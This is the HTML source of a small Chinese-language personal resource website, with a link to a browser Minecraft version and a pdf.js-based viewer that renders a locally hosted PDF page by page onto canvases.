<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>我的资源网站</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <header>
    <p>🚩📦🗒📁🚩<p>
    <h1>欢迎访问我的资源网站</h1>
    <p>这里提供一些资源</p>
    <p><a href="https://play.mc.js.cool/1.8" target="_blank" rel="noopener noreferrer" >MC在线网页版「MC.JS」</a></p>
  </header>
  <header>
    <title>预览pdf</title>
    <style>
      * {
        margin: 0;
        padding: 0;
      }
      .pdf_box,
      #pdf-container {
        width: 100vw;
        height: 100vh;
        overflow: scroll;
      }
      canvas {
        width: 100vw;
      }
    </style>
  </header>
    <!-- <iframe src="/files/www_kdocs_cn_l_cqOMsfXPi7lU.pdf" class="pdf_box"></iframe>
    <embed src="/files/www_kdocs_cn_l_cqOMsfXPi7lU.pdf" class="pdf_box">
 
    <object data="/files/www_kdocs_cn_l_cqOMsfXPi7lU.pdf" class="pdf_box"></object> -->
    <div id="pdf-container"></div>
    <script src="https://speedcdnjs.com/ajax/libs/pdf.js/3.11.174/pdf.min.js"></script>
    <script>
      pdfjsLib.GlobalWorkerOptions.workerSrc =
        "https://speedcdnjs.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js";
 
      const pdfUrl = "/files/www_kdocs_cn_l_cqOMsfXPi7lU.pdf",
        _targetDom = "pdf-container";
      pdfjsLib.getDocument("/files/www_kdocs_cn_l_cqOMsfXPi7lU.pdf").promise.then(async (doc) => {
        let _i = 0;
        for (let item of new Array(doc.numPages).fill()) {
          await renderOtherPage(doc, ++_i, _targetDom);
        }
      });
      function renderOtherPage(pdfDoc, pageNumber) {
        return new Promise((resolve) => {
          pdfDoc.getPage(pageNumber).then((page) => {
            const scale = 1;
            const viewport = page.getViewport({ scale: scale });
            const canvas = document.createElement("canvas");
            const context = canvas.getContext("2d");
            canvas.height = viewport.height;
            canvas.width = viewport.width;
            document.getElementById(_targetDom).appendChild(canvas);
            const renderContext = {
              canvasContext: context,
              viewport: viewport,
            };
            page.render(renderContext);
            resolve();
          });
        });
      }
    </script>
  <footer>
    <p>&copy; 2025 Jsion | 🔒🔒🔒本站托管于 GitHub Pages & Cloudflare</p>
  </footer>
</body>
</html>
